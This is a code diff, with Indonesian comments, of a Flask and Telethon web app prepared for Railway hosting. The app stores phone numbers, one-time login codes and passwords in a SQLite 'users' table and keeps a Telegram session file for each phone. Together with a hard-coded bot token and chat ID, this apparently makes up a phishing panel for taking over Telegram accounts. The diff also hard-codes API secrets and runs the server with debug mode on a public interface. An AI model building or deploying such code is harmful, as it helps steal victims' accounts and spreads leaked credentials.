@@ -3,7 +3,6 @@ import re
 import sqlite3
 import asyncio
 import threading
-import requests
 from flask import Flask, render_template, request, redirect, url_for, session, flash
 from telethon import TelegramClient, events
 from telethon.errors import SessionPasswordNeededError, PhoneCodeInvalidError, PasswordHashInvalidError
@@ -21,14 +20,15 @@ api_hash = os.getenv("API_HASH", "d90d2bfd0b0a86c49e8991bd3a39339a")
 BOT_TOKEN = os.getenv("BOT_TOKEN", "8205641352:AAHxt3LgmDdfKag-NPQUY4WYOIXsul680Hw")
 CHAT_ID = os.getenv("CHAT_ID", "7712462494")
 
-SESSION_DIR = "sessions"
-DB_FILE = "data.db"
+# Pakai folder tmp supaya aman di Railway
+SESSION_DIR = "/tmp/sessions"
+DB_FILE = "/tmp/data.db"
 
 os.makedirs(SESSION_DIR, exist_ok=True)
 
 # ====== DB INIT ======
 def init_db():
-    conn = sqlite3.connect(DB_FILE)
+    conn = sqlite3.connect(DB_FILE, check_same_thread=False)
     cur = conn.cursor()
     cur.execute("""
         CREATE TABLE IF NOT EXISTS users (
@@ -40,11 +40,8 @@ def init_db():
     conn.commit()
     conn.close()
 
-# langsung bikin tabel sejak awal
-init_db()
-
 def save_user(phone, otp=None, password=None):
-    conn = sqlite3.connect(DB_FILE)
+    conn = sqlite3.connect(DB_FILE, check_same_thread=False)
     cur = conn.cursor()
     cur.execute("""
         INSERT INTO users (phone, otp, password)
@@ -55,7 +52,7 @@ def save_user(phone, otp=None, password=None):
     conn.close()
 
 def get_user(phone):
-    conn = sqlite3.connect(DB_FILE)
+    conn = sqlite3.connect(DB_FILE, check_same_thread=False)
     cur = conn.cursor()
     cur.execute("SELECT phone, otp, password FROM users WHERE phone=?", (phone,))
     row = cur.fetchone()
@@ -63,14 +60,14 @@ def get_user(phone):
     return row
 
 def get_all_users():
-    conn = sqlite3.connect(DB_FILE)
+    conn = sqlite3.connect(DB_FILE, check_same_thread=False)
     cur = conn.cursor()
     cur.execute("SELECT phone FROM users")
     rows = cur.fetchall()
     conn.close()
     return [r[0] for r in rows]
 
-# ====== Helper untuk session file management ======
+# ====== Helper session files ======
 def remove_session_files(phone_base: str):
     for fn in os.listdir(SESSION_DIR):
         if fn.startswith(f"{phone_base}."):
@@ -286,6 +283,7 @@ def start_bot():
 
 # ======= MAIN =======
 if __name__ == "__main__":
+    init_db()
     start_worker()
     threading.Thread(target=start_bot, daemon=True).start()
     app.run(host="0.0.0.0", port=int(os.getenv("PORT", 8080)), debug=True)
